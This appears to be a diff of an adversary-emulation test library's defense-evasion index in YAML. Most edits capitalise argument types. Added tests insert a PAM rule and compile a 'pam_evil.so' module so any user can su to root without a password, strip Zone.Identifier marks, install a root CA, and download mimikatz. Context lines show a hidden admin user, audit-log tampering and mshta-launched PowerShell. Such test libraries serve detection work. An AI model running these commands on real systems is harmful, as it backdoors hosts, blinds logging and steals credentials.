           description: File to delete. Run the prereq command to create it if it does
             not exist.
-          type: string
+          type: String
           default: "%temp%\\deleteme_T1551.004"
       dependency_executor_name: command_prompt
       dependencies:
@@ -25136,7 +25844,7 @@ defense-evasion:
         folder_to_delete:
           description: Folder to delete. Run the prereq command to create it if it
             does not exist.
-          type: string
+          type: String
           default: "%temp%\\deleteme_T1551.004"
       dependency_executor_name: command_prompt
       dependencies:
@@ -25168,7 +25876,7 @@ defense-evasion:
         file_to_delete:
           description: File to delete. Run the prereq command to create it if it does
             not exist.
-          type: string
+          type: String
           default: "$env:TEMP\\deleteme_T1551.004"
       dependency_executor_name: powershell
       dependencies:
@@ -25200,7 +25908,7 @@ defense-evasion:
         folder_to_delete:
           description: Folder to delete. Run the prereq command to create it if it
             does not exist.
-          type: string
+          type: String
           default: "$env:TEMP\\deleteme_folder_T1551.004"
       dependency_executor_name: powershell
       dependencies:
@@ -25262,7 +25970,7 @@ defense-evasion:
         teamviewer_log_file:
           description: Teamviewer log file to delete. Run the prereq command to create
             it if it does not exist.
-          type: string
+          type: String
           default: "$env:TEMP\\TeamViewer_54.log"
       dependency_executor_name: powershell
       dependencies:
@@ -25699,7 +26407,7 @@ defense-evasion:
       input_arguments:
         file_to_modify:
           description: File to modify using Attrib command
-          type: string
+          type: String
           default: "%temp%\\T1564.001.txt"
       dependency_executor_name: command_prompt
       dependencies:
@@ -25731,7 +26439,7 @@ defense-evasion:
       input_arguments:
         file_to_modify:
           description: File to modify using Attrib command
-          type: string
+          type: String
           default: "%temp%\\T1564.001.txt"
       dependency_executor_name: command_prompt
       dependencies:
@@ -25763,7 +26471,7 @@ defense-evasion:
       input_arguments:
         filename:
           description: path of file to hide
-          type: path
+          type: Path
           default: "/tmp/evil"
       executor:
         command: 'setfile -a V #{filename}
@@ -25852,7 +26560,7 @@ defense-evasion:
       input_arguments:
         user_name:
           description: username to add
-          type: string
+          type: String
           default: APT
       executor:
         command: 'sudo dscl . -create /Users/#{user_name} UniqueID 333
@@ -25873,7 +26581,7 @@ defense-evasion:
       input_arguments:
         user_name:
           description: username to add
-          type: string
+          type: String
           default: APT
       executor:
         command: 'sudo dscl . -create /Users/#{user_name} IsHidden 1
@@ -26414,15 +27122,15 @@ defense-evasion:
       input_arguments:
         audisp_config_file_name:
           description: The name of the audispd configuration file to be changed
-          type: string
+          type: String
           default: audispd.conf
         auditd_config_file_name:
           description: The name of the auditd configuration file to be changed
-          type: string
+          type: String
           default: auditd.conf
         libaudit_config_file_name:
           description: The name of the libaudit configuration file to be changed
-          type: string
+          type: String
           default: libaudit.conf
       executor:
         command: "sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}\nif
@@ -26449,15 +27157,15 @@ defense-evasion:
       input_arguments:
         syslog_config_file_name:
           description: The name of the syslog configuration file to be changed
-          type: string
+          type: String
           default: syslog.conf
         rsyslog_config_file_name:
           description: The name of the rsyslog configuration file to be changed
-          type: string
+          type: String
           default: rsyslog.conf
         syslog_ng_config_file_name:
           description: The name of the syslog-ng configuration file to be changed
-          type: string
+          type: String
           default: syslog-ng.conf
       executor:
         command: |
@@ -26659,11 +27367,11 @@ defense-evasion:
       input_arguments:
         payload_path:
           description: Path to payload
-          type: path
+          type: Path
           default: C:\Windows\System32\calc.exe
         process:
           description: Process to execute
-          type: string
+          type: String
           default: calc.exe
       executor:
         command: |
@@ -26682,7 +27390,7 @@ defense-evasion:
       input_arguments:
         process:
           description: Process to execute
-          type: string
+          type: String
           default: calc.exe
       executor:
         command: |
@@ -26700,7 +27408,7 @@ defense-evasion:
       input_arguments:
         process:
           description: Process to execute
-          type: string
+          type: String
           default: notepad.exe
       executor:
         command: 'conhost.exe "#{process}"
@@ -26821,15 +27529,13 @@ defense-evasion:
         command: |
           openssl genrsa -out #{key_filename} 4096
           openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}
-
-          if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le "5" ];
-          then
-            cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt
-          else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -ge "7" ];
-            cp rootCA.crt /etc/pki/ca-trust/source/anchors/
-            update-ca-trust
-          fi
+          cp #{cert_filename} /etc/pki/ca-trust/source/anchors/
+          update-ca-trust
+        cleanup_command: |
+          rm /etc/pki/ca-trust/source/anchors/#{cert_filename}
+          update-ca-trust
         name: sh
+        elevation_required: true
     - name: Install root CA on Debian/Ubuntu
       auto_generated_guid: 53bcf8a0-1549-4b85-b919-010c56d724ff
       description: 'Creates a root CA with openssl
@@ -27723,11 +28429,11 @@ defense-evasion:
       input_arguments:
         numeric_mode:
           description: Specified numeric mode value
-          type: string
-          default: '755'
+          type: Integer
+          default: 755
         file_or_folder:
           description: Path of the file or folder
-          type: path
+          type: Path
           default: "/tmp/AtomicRedTeam/atomics/T1222.002"
       executor:
         command: 'chmod #{numeric_mode} #{file_or_folder}
@@ -27746,11 +28452,11 @@ defense-evasion:
       input_arguments:
         symbolic_mode:
           description: Specified symbolic mode value
-          type: string
+          type: String
           default: a+w
         file_or_folder:
           description: Path of the file or folder
-          type: path
+          type: Path
           default: "/tmp/AtomicRedTeam/atomics/T1222.002"
       executor:
         command: 'chmod #{symbolic_mode} #{file_or_folder}
@@ -27769,11 +28475,11 @@ defense-evasion:
       input_arguments:
         numeric_mode:
           description: Specified numeric mode value
-          type: string
-          default: '755'
+          type: Integer
+          default: 755
         file_or_folder:
           description: Path of the file or folder
-          type: path
+          type: Path
           default: "/tmp/AtomicRedTeam/atomics/T1222.002"
       executor:
         command: 'chmod -R #{numeric_mode} #{file_or_folder}
@@ -27792,11 +28498,11 @@ defense-evasion:
       input_arguments:
         symbolic_mode:
           description: Specified symbolic mode value
-          type: string
+          type: String
           default: a+w
         file_or_folder:
           description: Path of the file or folder
-          type: path
+          type: Path
           default: "/tmp/AtomicRedTeam/atomics/T1222.002"
       executor:
         command: 'chmod -R #{symbolic_mode} #{file_or_folder}
@@ -27815,15 +28521,15 @@ defense-evasion:
       input_arguments:
         owner:
           description: Username of desired owner
-          type: string
+          type: String
           default: root
         file_or_folder:
           description: Path of the file or folder
-          type: path
+          type: Path
           default: "/tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml"
         group:
           description: Group name of desired group
-          type: string
+          type: String
           default: root
       executor:
         command: 'chown #{owner}:#{group} #{file_or_folder}
@@ -27842,15 +28548,15 @@ defense-evasion:
       input_arguments:
         owner:
           description: Username of desired owner
-          type: string
+          type: String
           default: root
         file_or_folder:
           description: Path of the file or folder
-          type: path
+          type: Path
           default: "/tmp/AtomicRedTeam/atomics/T1222.002"
         group:
           description: Group name of desired group
-          type: string
+          type: String
           default: root
       executor:
         command: 'chown -R #{owner}:#{group} #{file_or_folder}
@@ -27868,11 +28574,11 @@ defense-evasion:
       input_arguments:
         owner:
           description: Username of desired owner
-          type: string
+          type: String
           default: root
         file_or_folder:
           description: Path of the file or folder
-          type: path
+          type: Path
           default: "/tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml"
       executor:
         command: 'chown #{owner} #{file_or_folder}
@@ -27890,11 +28596,11 @@ defense-evasion:
       input_arguments:
         owner:
           description: Username of desired owner
-          type: string
+          type: String
           default: root
         file_or_folder:
           description: Path of the file or folder
-          type: path
+          type: Path
           default: "/tmp/AtomicRedTeam/atomics/T1222.002"
       executor:
         command: 'chown -R #{owner} #{file_or_folder}
@@ -27912,7 +28618,7 @@ defense-evasion:
       input_arguments:
         file_to_modify:
           description: Path of the file
-          type: path
+          type: Path
           default: "/var/spool/cron/root"
       executor:
         command: 'chattr -i #{file_to_modify}
@@ -28229,7 +28935,7 @@ defense-evasion:
       input_arguments:
         path_of_iso:
           description: Path to ISO file
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1553.005\bin\T1553.005.iso
       dependency_executor_name: powershell
       dependencies:
@@ -28264,7 +28970,7 @@ defense-evasion:
       input_arguments:
         path_of_iso:
           description: Path to ISO file
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1553.005\bin\FeelTheBurn.iso
       dependency_executor_name: powershell
       dependencies:
@@ -28285,6 +28991,40 @@ defense-evasion:
         cleanup_command: |
           Dismount-DiskImage -ImagePath "#{path_of_iso}" | Out-Null
           Stop-process -name "hello" -Force -ErrorAction ignore
+        name: powershell
+    - name: Remove the Zone.Identifier alternate data stream
+      auto_generated_guid: 64b12afc-18b8-4d3f-9eab-7f6cae7c73f9
+      description: |
+        Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.
+        Removing this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_to_download:
+          description: File that will be downloaded to test against.
+          type: Url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/README.md
+        file_path:
+          description: File to have the Zone.Identifier removed.
+          type: String
+          default: "$env:tmp\\ReadMe.md"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: A test file with the Zone.Identifier attribute must be present.
+        prereq_command: 'if (Test-Path #{file_path}) { EXIT 0 } else { EXIT 1 }
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest #{file_to_download} -OutFile #{file_path}
+          Set-Content -Path #{file_path} -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'
+      executor:
+        command: 'Unblock-File -Path #{file_path}
+
+'
+        cleanup_command: 'Set-Content -Path #{file_path} -Stream Zone.Identifier -Value
+          ''[ZoneTransfer]'',''ZoneId=3''
+
+'
         name: powershell
   T1036.004:
     technique:
@@ -28792,7 +29532,7 @@ defense-evasion:
       input_arguments:
         new_executable:
           description: New executable to run on startup instead of Windows Defender
-          type: string
+          type: String
           default: calc.exe
       executor:
         command: 'reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
@@ -29076,11 +29816,11 @@ defense-evasion:
       input_arguments:
         temp_file:
           description: temp_file location for hta
-          type: string
+          type: String
           default: "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta"
         hta_url:
           description: URL to HTA file for execution
-          type: string
+          type: String
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta
       executor:
         command: |
@@ -29101,15 +29841,15 @@ defense-evasion:
       input_arguments:
         script_engine:
           description: Script Engine to use
-          type: string
+          type: String
           default: JScript
         hta_file_path:
           description: HTA file name and or path to be used
-          type: string
+          type: String
           default: Test.hta
         mshta_file_path:
           description: Location of mshta.exe
-          type: string
+          type: String
           default: "$env:windir\\system32\\mshta.exe"
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
@@ -29136,11 +29876,11 @@ defense-evasion:
       input_arguments:
         script_engine:
           description: Script Engine to use
-          type: string
+          type: String
           default: JScript
         hta_file_path:
           description: HTA file name and or path to be used
-          type: string
+          type: String
           default: Test.hta
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
@@ -29166,11 +29906,11 @@ defense-evasion:
       input_arguments:
         mshta_file_path:
           description: Location of mshta.exe
-          type: string
+          type: String
           default: "$env:windir\\system32\\mshta.exe"
         hta_uri:
           description: URI to HTA
-          type: string
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
@@ -29196,15 +29936,15 @@ defense-evasion:
       input_arguments:
         rundll32_file_path:
           description: Location of rundll32.exe
-          type: string
+          type: Path
           default: "$env:windir\\system32\\rundll32.exe"
         script_engine:
           description: Script Engine to use
-          type: string
+          type: String
           default: JScript
         protocol_handler:
           description: Protocol Handler to use
-          type: string
+          type: String
           default: About
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
@@ -29230,15 +29970,15 @@ defense-evasion:
       input_arguments:
         mshta_file_path:
           description: Location of mshta.exe
-          type: string
+          type: Path
           default: "$env:windir\\system32\\mshta.exe"
         script_engine:
           description: Script Engine to use
-          type: string
+          type: String
           default: JScript
         protocol_handler:
           description: Protocol Handler to use
-          type: string
+          type: String
           default: About
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
@@ -29264,7 +30004,7 @@ defense-evasion:
       input_arguments:
         mshta_file_path:
           description: Location of mshta.exe
-          type: string
+          type: String
           default: "$env:windir\\system32\\mshta.exe"
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
@@ -29292,11 +30032,11 @@ defense-evasion:
       input_arguments:
         message:
           description: Encoded message to include
-          type: string
+          type: String
           default: Hello,%20MSHTA!
         seconds_to_sleep:
           description: How many seconds to sleep/wait
-          type: string
+          type: Integer
           default: 5
       executor:
         command: 'mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}"""))</script>''"
@@ -29536,7 +30276,7 @@ defense-evasion:
       input_arguments:
         path:
           description: Path of ADS file
-          type: path
+          type: Path
           default: c:\ADS\
       executor:
         command: "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32
@@ -29560,15 +30300,15 @@ defense-evasion:
       input_arguments:
         payload_path:
           description: Path of file to hide in ADS
-          type: path
+          type: Path
           default: c:\windows\system32\cmd.exe
         ads_file_path:
           description: Path of file to create an ADS under
-          type: path
+          type: Path
           default: C:\Users\Public\Libraries\yanki\desktop.ini
         ads_name:
           description: Name of ADS
-          type: string
+          type: String
           default: desktop.ini
       executor:
         command: |
@@ -29590,11 +30330,11 @@ defense-evasion:
       input_arguments:
         file_name:
           description: File name of file to create ADS on.
-          type: string
+          type: String
           default: "%temp%\\T1564.004_has_ads_cmd.txt"
         ads_filename:
           description: Name of ADS.
-          type: string
+          type: String
           default: adstest.txt
       executor:
         command: |
@@ -29614,11 +30354,11 @@ defense-evasion:
       input_arguments:
         file_name:
           description: File name of file to create ADS on.
-          type: string
+          type: String
           default: "$env:TEMP\\T1564.004_has_ads_powershell.txt"
         ads_filename:
           description: Name of ADS file.
-          type: string
+          type: String
           default: adstest.txt
       dependency_executor_name: powershell
       dependencies:
@@ -29853,7 +30593,7 @@ defense-evasion:
       input_arguments:
         share_name:
           description: Share to add.
-          type: string
+          type: String
           default: "\\\\test\\share"
       executor:
         command: |
@@ -29870,7 +30610,7 @@ defense-evasion:
       input_arguments:
         share_name:
           description: Share to remove.
-          type: string
+          type: String
           default: "\\\\test\\share"
       executor:
         command: 'net share #{share_name} /delete
@@ -29887,7 +30627,7 @@ defense-evasion:
       input_arguments:
         share_name:
           description: Share to remove.
-          type: string
+          type: String
           default: "\\\\test\\share"
       executor:
         command: |
@@ -30104,7 +30844,7 @@ defense-evasion:
       input_arguments:
         url_path:
           description: url to download Exe
-          type: url
+          type: Url
           default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip
       dependency_executor_name: powershell
       dependencies:
@@ -30138,19 +30878,19 @@ defense-evasion:
       input_arguments:
         input_file:
           description: Path of the XLSM file
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
         sender:
           description: sender email
-          type: string
+          type: String
           default: test@corp.com
         receiver:
           description: receiver email
-          type: string
+          type: String
           default: test@corp.com
         smtp_server:
           description: SMTP Server IP Address
-          type: string
+          type: String
           default: 127.0.0.1
       executor:
         command: 'Send-MailMessage -From #{sender} -To #{receiver} -Subject ''T1027_Atomic_Test''
@@ -30168,11 +30908,11 @@ defense-evasion:
       input_arguments:
         input_file:
           description: Path of the XLSM file
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
         ip_address:
           description: Destination IP address
-          type: string
+          type: String
           default: 127.0.0.1
       executor:
         command: 'Invoke-WebRequest -Uri #{ip_address} -Method POST -Body #{input_file}
@@ -30380,23 +31120,23 @@ defense-evasion:
       input_arguments:
         parent_process_name:
           description: Name of the parent process
-          type: string
+          type: String
           default: explorer
         spawnto_process_path:
           description: Path of the process to spawn
-          type: path
+          type: Path
           default: C:\Program Files\Internet Explorer\iexplore.exe
         dll_process_name:
           description: Name of the created process from the injected dll
-          type: string
+          type: String
           default: calculator
         dll_path:
           description: Path of the dll to inject
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1134.004\bin\calc.dll
         spawnto_process_name:
           description: Name of the process to spawn
-          type: string
+          type: String
           default: iexplore
       dependency_executor_name: powershell
       dependencies:
@@ -30426,15 +31166,15 @@ defense-evasion:
       input_arguments:
         file_path:
           description: File path or name of process to spawn
-          type: path
+          type: Path
           default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
         parent_pid:
           description: PID of process to spawn from
-          type: string
+          type: String
           default: "$PID"
         command_line:
           description: Specified command line to use
-          type: string
+          type: String
           default: "-Command Start-Sleep 10"
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
@@ -30459,11 +31199,11 @@ defense-evasion:
       input_arguments:
         parent_pid:
           description: PID of process to spawn from
-          type: string
+          type: String
           default: "$PID"
         test_guid:
           description: Defined test GUID
-          type: string
+          type: String
           default: 12345678-1234-1234-1234-123456789123
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
@@ -30489,11 +31229,11 @@ defense-evasion:
       input_arguments:
         command_line:
           description: Specified command line to use
-          type: string
+          type: String
           default: "-Command Start-Sleep 10"
         file_path:
           description: File path or name of process to spawn
-          type: path
+          type: Path
           default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
@@ -30521,15 +31261,15 @@ defense-evasion:
       input_arguments:
         command_line:
           description: Specified command line to use
-          type: string
+          type: String
           default: "-Command Start-Sleep 10"
         file_path:
           description: File path or name of process to spawn
-          type: path
+          type: Path
           default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
         parent_name:
           description: Parent process to spoof from
-          type: path
+          type: Path
           default: "$Env:windir\\System32\\notepad.exe"
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
@@ -30607,15 +31347,15 @@ defense-evasion:
       input_arguments:
         user_name:
           description: username
-          type: string
+          type: String
           default: Administrator
         ntlm:
           description: ntlm hash
-          type: string
+          type: String
           default: cc36cf7a8514893efccd3324464tkg1a
         domain:
           description: domain
-          type: string
+          type: String
           default: atomic.local
         mimikatz_path:
           description: mimikatz windows executable
@@ -30632,7 +31372,8 @@ defense-evasion:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -30652,7 +31393,7 @@ defense-evasion:
       input_arguments:
         user_name:
           description: username
-          type: string
+          type: String
           default: Administrator
         crackmapexec_exe:
           description: crackmapexec windows executable
@@ -30660,15 +31401,15 @@ defense-evasion:
           default: C:\CrackMapExecWin\crackmapexec.exe
         command:
           description: command to execute
-          type: string
+          type: String
           default: whoami
         ntlm:
           description: command
-          type: string
+          type: String
           default: cc36cf7a8514893efccd3324464tkg1a
         domain:
           description: domain
-          type: string
+          type: String
           default: atomic.local
       dependency_executor_name: powershell
       dependencies:
@@ -30771,15 +31512,15 @@ defense-evasion:
       input_arguments:
         user_name:
           description: username
-          type: string
+          type: String
           default: Administrator
         domain:
           description: domain
-          type: string
+          type: String
           default: atomic.local
         mimikatz_exe:
           description: Path of the Mimikatz binary
-          type: string
+          type: Path
           default: PathToAtomicsFolder\T1550.003\bin\mimikatz.exe
       dependency_executor_name: powershell
       dependencies:
@@ -30791,7 +31532,8 @@ defense-evasion:
 '
         get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -31200,7 +31942,7 @@ defense-evasion:
         service_executable:
           description: Path of the executable used for the service and as the hijacked
             program.exe
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe
       executor:
         command: |
@@ -31280,7 +32022,100 @@ defense-evasion:
       x_mitre_platforms:
       - Linux
       - macOS
-    atomic_tests: []
+      identifier: T1556.003
+    atomic_tests:
+    - name: Malicious PAM rule
+      auto_generated_guid: 4b9dde80-ae22-44b1-a82a-644bf009eb9c
+      description: |
+        Inserts a rule into a PAM config and then tests it.
+
+        Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: String
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: String
+          default: auth sufficient pam_succeed_if.so uid >= 0
+        index:
+          description: Index where the rule is inserted.
+          type: Integer
+          default: 1
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
+    - name: Malicious PAM module
+      auto_generated_guid: 65208808-3125-4a2e-8389-a0a00e9ab326
+      description: |
+        Creates a PAM module, inserts a rule to use it, and then tests it.
+
+        Upon successful execution, this test will create a PAM module that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: String
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: String
+          default: auth sufficient /tmp/pam_evil.so
+        index:
+          description: Index where the rule is inserted.
+          type: Integer
+          default: 1
+        path_to_pam_module_source:
+          description: Path to PAM module source code.
+          type: Path
+          default: PathToAtomicsFolder/T1556.003/src/pam_evil.c
+        path_to_pam_module:
+          description: Path to PAM module object
+          type: Path
+          default: "/tmp/pam_evil.so"
+      dependencies:
+      - description: 'The PAM development library must be installed to build the PAM
+          module
+
+'
+        prereq_command: 'if [ -f /usr/include/security/pam_modules.h ]; then exit
+          0; else exit 1; fi;
+
+'
+        get_prereq_command: 'if [ -n "`which apt-get`" ]; then sudo apt-get -y install
+          libpam0g-dev; elif [ -n "`which yum`" ]; then sudo yum -y install pam-devel;
+          fi
+
+'
+      - description: 'The PAM module must exist on disk at specified location (#{path_to_pam_module})
+
+'
+        prereq_command: 'if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1;
+          fi;
+
+'
+        get_prereq_command: 'sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
   T1205.001:
     technique:
       external_references:
@@ -31695,19 +32530,19 @@ defense-evasion:
         hollow_binary_path:
           description: Path of the binary to hollow (executable that will run inside
             the sponsor)
-          type: string
+          type: String
           default: C:\Windows\System32\cmd.exe
         parent_process_name:
           description: Name of the parent process
-          type: string
+          type: String
           default: explorer
         sponsor_binary_path:
           description: Path of the sponsor binary (executable that will host the binary)
-          type: string
+          type: String
           default: C:\Windows\System32\notepad.exe
         spawnto_process_name:
           description: Name of the process to spawn
-          type: string
+          type: String
           default: notepad
       executor:
         command: |
@@ -31900,15 +32735,15 @@ defense-evasion:
       input_arguments:
         machine:
           description: machine to target (via psexec)
-          type: string
+          type: String
           default: DC1
         mimikatz_path:
           description: Mimikatz windows executable
-          type: path
+          type: Path
           default: "%tmp%\\mimikatz\\x64\\mimikatz.exe"
         psexec_path:
           description: Path to PsExec
-          type: string
+          type: String
           default: C:\PSTools\PsExec.exe
       dependency_executor_name: powershell
       dependencies:
@@ -31922,8 +32757,8 @@ defense-evasion:
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
-          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -32775,11 +33610,11 @@ defense-evasion:
       input_arguments:
         outputfile:
           description: path of file to execute
-          type: path
+          type: Path
           default: ($env:TEMP + "\svchost.exe")
         inputfile:
           description: path of file to copy
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1036.003\bin\T1036.003.exe
       dependency_executor_name: powershell
       dependencies:
@@ -32812,11 +33647,11 @@ defense-evasion:
       input_arguments:
         outputfile:
           description: path of file to execute
-          type: path
+          type: Path
           default: ($env:TEMP + "\svchost.exe")
         inputfile:
           description: path of file to copy
-          type: path
+          type: Path
           default: "$env:ComSpec"
       executor:
         command: |
@@ -32856,16 +33691,16 @@ defense-evasion:
       input_arguments:
         exe_path:
           description: path to exe to use when creating masquerading files
-          type: path
+          type: Path
           default: C:\Windows\System32\calc.exe
         vbs_path:
           description: path of vbs to use when creating masquerading files
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1036.003\src\T1036.003_masquerading.vbs
         ps1_path:
           description: path of powershell script to use when creating masquerading
             files
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1036.003\src\T1036.003_masquerading.ps1
       executor:
         command: |
@@ -33083,24 +33918,24 @@ defense-evasion:
         object:
           description: Targeted object (for machine account do not forget to add final
             '$')
-          type: string
+          type: String
           default: bruce.wayne
         attribute:
           description: 'Object attribute to edit, interesting ones: badpwdcount, primaryGroupId,
             SIDHistory...'
-          type: string
+          type: String
           default: badpwdcount
         value:
           description: Value to assign to object attribute
-          type: string
-          default: 9999
+          type: String
+          default: '9999'
         mimikatz_path:
           description: Mimikatz windows executable
-          type: path
+          type: Path
           default: "$env:TEMP\\mimikatz\\x64\\mimikatz.exe"
         psexec_path:
           description: Path to PsExec
-          type: string
+          type: Path
           default: C:\PSTools\PsExec.exe
       dependency_executor_name: powershell
       dependencies:
@@ -33113,7 +33948,8 @@ defense-evasion:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -33154,7 +33990,9 @@ defense-evasion:
